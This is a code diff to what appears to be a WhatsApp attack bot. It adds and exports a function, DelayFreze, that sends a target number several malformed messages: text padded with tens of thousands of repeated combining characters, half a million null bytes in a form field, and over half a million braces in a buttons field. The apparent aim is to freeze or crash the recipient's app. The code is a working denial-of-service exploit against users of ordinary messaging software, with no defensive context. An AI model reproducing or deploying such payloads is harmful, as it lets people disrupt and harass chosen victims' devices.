@@ -3475,6 +3475,81 @@ async function BuritMambu(sock, target) {
     console.log(e);
   }
 }
+
+//New Func 06-10-2026
+async function DelayFreze(target) {
+await sock.relayMessage(target, {
+  groupStatusMessageV2: {  
+    message: {
+      interactiveResponseMessage: {
+        body: {
+          text: "RΛ‌Ν‌Ѕ ‌‌- T‌ΞϾ‌H" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
+          format: "EXTENSION_1"
+        },
+        nativeFlowResponseMessage: {
+          name: "galaxy_message",
+          paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"RanstechZvX@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"ok\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+          version: 3
+        },
+        contextInfo: {
+         forwardingScore: 9999,
+         isForwarded: true,
+         entryPointConversionSource: "payment_method"
+        }
+      }
+    }
+  }
+}, { participant: { jid: target }});
+  
+      await sock.relayMessage(target, {
+          groupStatusMessageV2: {
+              message: {
+                  interactiveMessage: {
+                      body: {
+                        text: "RΛ‌Ν‌Ѕ ‌‌- T‌ΞϾ‌H" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
+                        format: "DEFAULT"
+                      },
+                      nativeFlowMessage: {
+                          buttons: "{".repeat(544444)
+                      },
+                      contextInfo: {
+                       forwardingScore: 9999,
+                       isForwarded: true,
+                       entryPointConversionSource: "address_message", 
+                       quotedMessage: {
+                         conversation: "ꦽ".repeat(90000),
+                       }
+                     }
+                  }
+              }
+          }
+      }, { participant: { jid: target }});    
+
+      sock.relayMessage(target, {
+          extendedTextMessage: {
+            text: "RΛ‌Ν‌Ѕ ‌‌- T‌ΞϾ‌H" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
+            contextInfo: {
+              fromMe: false,
+              stanzaId: ransxd.generateMessageTag(),
+              participant: "0@s.whatsapp.net",
+              mentionedJid: [github],
+              quotedMessage: {
+                conversation: "ꦽ".repeat(90000),
+              },
+              disappearingMode: {
+                initiator: 1,
+                trigger: 2,
+              },
+            },
+            inviteLinkGroupTypeV2: "DEFAULT",
+          },
+        }, { participant: { jid: target },
+        },
+        {
+          messageId: null,
+        }
+      );
+    }
 module.exports = {
   // Session management
   activeConnections,
@@ -3550,4 +3625,5 @@ BetaExploit,
   blanokmhk,
   blapoymnk,
   R9X,
+  DelayFreze,
 };
